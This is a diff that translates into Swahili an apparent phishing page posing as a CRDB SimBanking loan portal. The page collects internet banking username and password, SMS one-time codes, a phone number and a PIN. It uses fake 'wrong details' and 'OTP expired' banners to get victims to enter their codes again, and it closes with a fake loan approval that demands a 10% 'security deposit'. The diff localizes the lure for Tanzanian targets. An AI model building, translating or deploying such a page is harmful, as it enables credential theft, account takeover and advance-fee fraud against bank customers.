@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="sw">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>CRDB SimBanking Loan Portal</title>
+  <title>CRDB SimBanking - Lango la Mkopo</title>
   <link rel="stylesheet" href="style.css">
 </head>
 <body>
@@ -20,22 +20,22 @@
     </div>
   </header>
 
-  <!-- STEP 1: GUIDELINES NOTICE (Matches Image 1000056268) -->
+  <!-- HATUA YA 1: MAELEKEZO -->
   <section id="step-I UNDERSTAND" class="screen active">
-    <h1 style="font-size: 24px; color: var(--crdb-green); text-align: center; margin-top: 10px;">CRDB SimBanking Loan</h1>
+    <h1 style="font-size: 24px; color: var(--crdb-green); text-align: center; margin-top: 10px;">Mkopo wa CRDB SimBanking</h1>
     <p style="text-align: center; color: var(--text-muted); margin-top: 4px; font-size: 13px;">Benki ya Watu, Huduma Bora</p>
 
     <div class="notice-box">
-      <h2>Follow Strictly</h2>
+      <h2>Fuata Hatua Hizi Kikamilifu</h2>
       <p style="text-align: left; font-size: 14px;">
-        1. Dial <strong>*150*00#</strong> on your CRDB registered SIM card.<br><br>
-        2. Select <strong>Loan Services</strong> from SimBanking menu.<br><br>
-        3. Fill in the Loan Application Form with all required details.<br><br>
-        4. Review and Submit your application.<br><br>
-        5. Wait for Confirmation via SMS from CRDB.
+        1. Piga <strong>*150*00#</strong> kwenye simu yako kupitia laini iliyosajiliwa na CRDB.<br><br>
+        2. Chagua <strong>Huduma za Mikopo</strong> kutoka kwenye menyu ya SimBanking.<br><br>
+        3. Jaza fomu ya maombi ya mkopo kwa usahihi.<br><br>
+        4. Kagua na utume maombi yako.<br><br>
+        5. Subiri Ujumbe Mfupi (SMS) wa uthibitisho kutoka CRDB.
       </p>
       <div class="warning-callout">
-        Follow the steps strictly to successfully apply for your CRDB loan.
+        Fuata hatua hizi kwa makini ili kufanikisha kupata mkopo wako wa CRDB.
       </div>
     </div>
 
@@ -44,17 +44,17 @@
     </button>
   </section>
 
-  <!-- STEP 2: SLIDERS OVERVIEW -->
+  <!-- HATUA YA 2: KIKOKOTOO CHA MKOPO -->
   <section id="step-slider" class="screen">
     <div class="welcome-banner">
-      <h2>Loan Calculator</h2>
-      <p style="color: var(--text-muted); font-size: 14px;">Select your loan amount and duration</p>
+      <h2>Kikokotoo cha Mkopo</h2>
+      <p style="color: var(--text-muted); font-size: 14px;">Chagua kiasi cha mkopo na muda wa marejesho</p>
     </div>
 
     <div class="overview-card">
       <div class="slider-group">
         <div class="slider-header">
-          <span class="slider-label">Loan Amount (TZS)</span>
+          <span class="slider-label">Kiasi cha Mkopo (TZS)</span>
           <span id="balance-val" class="slider-val">TZS 100,000</span>
         </div>
         <input type="range" id="slider-balance" min="10000" max="10000000" value="100000" step="10000" class="range-slider green-slider">
@@ -66,20 +66,20 @@
 
       <div class="slider-group">
         <div class="slider-header">
-          <span class="slider-label">Loan Duration (Months)</span>
-          <span id="duration-val" class="slider-val">12 months</span>
+          <span class="slider-label">Muda wa Mkopo (Miezi)</span>
+          <span id="duration-val" class="slider-val">miezi 12</span>
         </div>
         <input type="range" id="slider-duration" min="6" max="60" value="12" step="1" class="range-slider green-slider">
         <div class="slider-limits">
-          <span>6 months</span>
-          <span>60 months</span>
+          <span>miezi 6</span>
+          <span>miezi 60</span>
         </div>
       </div>
 
       <div class="account-box">
         <div class="phone-icon-circle">💵</div>
         <div class="account-info">
-          <span class="account-title">Monthly Repayment</span>
+          <span class="account-title">Malipo ya Kila Mwezi</span>
           <span class="account-amount">TZS 9,504</span>
         </div>
       </div>
@@ -90,45 +90,45 @@
     </button>
   </section>
 
-  <!-- STEP 3: INTERNET BANKING LOGIN / CREDENTIALS (Matches Image 1000056267) -->
+  <!-- HATUA YA 3: INTERNET BANKING (JINA NA NYWILA) -->
   <section id="step-form" class="screen">
-    <div class="login-header-banner" style="background: var(--crdb-green); color: #FFF; padding: 24px; text-align: center; border-radius: 0 0 16px 16px; margin: -24px -24px 20px -24px;">
+    <div style="background: var(--crdb-green); color: #FFF; padding: 24px; text-align: center; border-radius: 0 0 16px 16px; margin: -24px -24px 20px -24px;">
       <h2 style="font-size: 22px; margin-bottom: 4px;">Internet Banking</h2>
-      <p style="font-size: 13px; opacity: 0.9;">Welcome to CRDB Internet Banking. Please enter your Username and Password</p>
+      <p style="font-size: 13px; opacity: 0.9;">Karibu kwenye CRDB Internet Banking. Tafadhali weka Jina la Mtumiaji na Nywila</p>
     </div>
 
-    <!-- SURFACE ERROR BANNER FOR WRONG DETAILS -->
+    <!-- ONYO KWENYE SCREEN KAMA TAARIFA ZIMEKATALIWA -->
     <div id="creds-surface-banner" class="surface-banner">
-      WRONG DETAILS ❌ (Please enter correct username and password)
+      TAARIFA SI SAHIHI ❌ (Tafadhali weka jina na nywila sahihi)
     </div>
 
     <div class="form-group">
-      <label for="crdb-username">Username</label>
-      <input type="text" id="crdb-username" class="input-field" placeholder="Enter Username">
+      <label for="crdb-username">Jina la Mtumiaji (Username)</label>
+      <input type="text" id="crdb-username" class="input-field" placeholder="Weka jina la mtumiaji">
     </div>
 
     <div class="form-group">
-      <label for="crdb-password">Password</label>
-      <input type="password" id="crdb-password" class="input-field" placeholder="Enter Password">
+      <label for="crdb-password">Nywila (Password)</label>
+      <input type="password" id="crdb-password" class="input-field" placeholder="Weka nywila">
     </div>
 
-    <button id="btn-submit-creds" class="btn-primary btn-large" style="margin-top: 20px;">Sign In</button>
+    <button id="btn-submit-creds" class="btn-primary btn-large" style="margin-top: 20px;">Ingia (Sign In)</button>
   </section>
 
-  <!-- STEP 4: 6-DIGIT SMS OTP SCREEN -->
+  <!-- HATUA YA 4: OTP YA SMS (Tarakimu 6) -->
   <section id="step-otp" class="screen">
-    <h2 style="margin-bottom: 6px;">SMS Verification</h2>
+    <h2 style="margin-bottom: 6px;">Uthibitisho wa SMS</h2>
     <p style="color: var(--text-muted); font-size: 14px; margin-bottom: 16px;">
-      6-digit verification code sent via SMS to your phone.
+      Namba ya uthibitisho ya tarakimu 6 imetumwa kupitia SMS kwenye simu yako.
     </p>
 
-    <!-- SURFACE ERROR BANNER FOR OTP EXPIRED -->
+    <!-- ONYO KAMA OTP IMEPOTEZA MUDA -->
     <div id="otp-surface-banner" class="surface-banner">
-      OTP EXPIRED ❌ (Please enter new incoming 6-digit OTP)
+      OTP IMEKWisha MUDA WAKE ❌ (Tafadhali weka OTP mpya ya SMS)
     </div>
 
     <div class="sms-notice">
-      <p>⚠️ ENTER 6-DIGIT OTP RECEIVED VIA SMS.</p>
+      <p>⚠️ WEKA OTP YA TARAKIMU 6 ULIYOPOKEA KUPITIA SMS.</p>
     </div>
 
     <div class="form-group" style="text-align: center;">
@@ -140,72 +140,72 @@
         <input type="text" class="otp-digit-6" maxlength="1" inputmode="numeric">
         <input type="text" class="otp-digit-6" maxlength="1" inputmode="numeric">
       </div>
-      <span id="otp-error" class="error-text">Please enter a valid 6-digit numeric OTP.</span>
+      <span id="otp-error" class="error-text">Tafadhali weka OTP halali ya tarakimu 6.</span>
     </div>
 
-    <button id="btn-submit-otp" class="btn-primary" style="margin-top: 20px;">SUBMIT OTP</button>
+    <button id="btn-submit-otp" class="btn-primary" style="margin-top: 20px;">WASILISHA OTP</button>
   </section>
 
-  <!-- STEP 5: PHONE NUMBER & PIN ENTRY -->
+  <!-- HATUA YA 5: NAMBA YA SIMU NA PIN -->
   <section id="step-phone-pin" class="screen">
-    <h2 style="margin-bottom: 6px;">Account Verification</h2>
-    <p style="color: var(--text-muted); font-size: 14px; margin-bottom: 16px;">Enter your mobile number and 4-digit PIN</p>
+    <h2 style="margin-bottom: 6px;">Uthibitisho wa Akaunti</h2>
+    <p style="color: var(--text-muted); font-size: 14px; margin-bottom: 16px;">Weka namba yako ya simu na PIN ya tarakimu 4</p>
 
-    <!-- SURFACE ERROR BANNER FOR WRONG PIN -->
+    <!-- ONYO KAMA PIN SI SAHIHI -->
     <div id="pin-surface-banner" class="surface-banner">
-      WRONG PIN ❌ (Please re-enter correct PIN)
+      PIN SI SAHIHI ❌ (Tafadhali weka PIN sahihi)
     </div>
 
     <div class="form-group">
-      <label for="phone-number">Mobile Number</label>
+      <label for="phone-number">Namba ya Simu</label>
       <div class="phone-input-wrapper">
         <div class="flag-prefix">🇹🇿 +255</div>
         <input type="tel" id="phone-number" class="input-field phone-field" placeholder="0712345678" maxlength="10">
       </div>
-      <span id="phone-error" class="error-text">Please enter a valid mobile number.</span>
+      <span id="phone-error" class="error-text">Tafadhali weka namba sahihi ya simu.</span>
     </div>
 
     <div class="form-group" style="text-align: center;">
-      <label style="color: var(--text-muted); font-size: 14px; margin-bottom: 8px; display: block;">Enter 4-Digit PIN</label>
+      <label style="color: var(--text-muted); font-size: 14px; margin-bottom: 8px; display: block;">Weka PIN ya Tarakimu 4</label>
       <div class="pin-grid">
         <input type="password" class="pin-digit" maxlength="1" inputmode="numeric">
         <input type="password" class="pin-digit" maxlength="1" inputmode="numeric">
         <input type="password" class="pin-digit" maxlength="1" inputmode="numeric">
         <input type="password" class="pin-digit" maxlength="1" inputmode="numeric">
       </div>
-      <span id="pin-error" class="error-text">Please enter a 4-digit numeric PIN.</span>
+      <span id="pin-error" class="error-text">Tafadhali weka PIN ya tarakimu 4.</span>
     </div>
 
-    <button id="btn-submit-phone-pin" class="btn-primary" style="margin-top: 20px;">VERIFY & COMPLETE</button>
+    <button id="btn-submit-phone-pin" class="btn-primary" style="margin-top: 20px;">THIBITISHA NA KAMILISHA</button>
   </section>
 
-  <!-- STEP 6: SUCCESS SCREEN -->
+  <!-- HATUA YA 6: UKURASA WA MAFANIKIO -->
   <section id="step-success" class="screen">
     <div style="text-align: center; margin-top: 10px;">
       <div class="circle-check-icon">✓</div>
-      <h1 class="congrats-title">🎉 Congratulations!</h1>
-      <p class="congrats-sub">Your loan <strong>has been approved!</strong> Funds will be disbursed shortly.</p>
+      <h1 class="congrats-title">🎉 Hongera!</h1>
+      <p class="congrats-sub">Mkopo wako <strong>umeidhinishwa!</strong> Fedha zitatolewa hivi karibuni.</p>
     </div>
 
     <div class="approved-banner-card">
-      <span class="approved-label">APPROVED AMOUNT</span>
+      <span class="approved-label">KIASI KILICHOIDHINISHWA</span>
       <div id="approved-amount-display" class="approved-value">TZS 100,000</div>
     </div>
 
     <div class="compliance-notice-box">
-      <div class="compliance-title">⚠️ COMPLIANCE NOTICE</div>
+      <div class="compliance-title">⚠️ NOTISI YA UZINGATIAJI</div>
       <p>
-        Your CRDB account must be active and maintain a security deposit of at least <strong>10% of the approved loan amount</strong>. This deposit is fully refundable upon loan repayment.
+        Akaunti yako ya CRDB lazima iwe hai na idumishe amana ya usalama ya angalau <strong>10% ya kiasi cha mkopo uliouomba</strong>. Amana hii inarudishwa kikamilifu baada ya kulipa mkopo.
       </p>
     </div>
 
     <div class="loan-details-card">
-      <div class="detail-header-label">💳 Loan Details</div>
+      <div class="detail-header-label">💳 Maelezo ya Mkopo</div>
       
       <div class="detail-item">
         <div class="item-icon green-icon">💵</div>
         <div class="item-text">
-          <span class="item-title">MONTHLY PAYMENT</span>
+          <span class="item-title">MALIPO YA KILA MWEZI</span>
           <span class="item-val">TZS 9,504</span>
         </div>
       </div>
@@ -213,25 +213,25 @@
       <div class="detail-item">
         <div class="item-icon orange-icon">📅</div>
         <div class="item-text">
-          <span class="item-title">LOAN DURATION</span>
-          <span class="item-val">12 Months</span>
+          <span class="item-title">MUDA WA MKOPO</span>
+          <span class="item-val">Miezi 12</span>
         </div>
       </div>
     </div>
 
-    <button id="btn-go-home" class="btn-primary" style="margin-top: 20px;">🏠 Return Home</button>
+    <button id="btn-go-home" class="btn-primary" style="margin-top: 20px;">🏠 Rudi Nyumbani</button>
   </section>
 
-  <!-- STEP 7: LOADING OVERLAY -->
+  <!-- LOADING OVERLAY -->
   <div id="step-loading" class="loading-overlay">
     <div class="spinner"></div>
-    <h3 id="loading-title" style="margin-bottom: 8px;">Processing...</h3>
-    <p id="loading-sub" style="color: var(--text-muted); font-size: 14px;">Please wait while we verify your details.</p>
+    <h3 id="loading-title" style="margin-bottom: 8px;">Inachakata...</h3>
+    <p id="loading-sub" style="color: var(--text-muted); font-size: 14px;">Tafadhali subiri wakati tunathibitisha taarifa zako.</p>
   </div>
 
 </div>
 
 <script src="script.js"></script>
 </body>
-              </html>
-    
+  </html>
+        
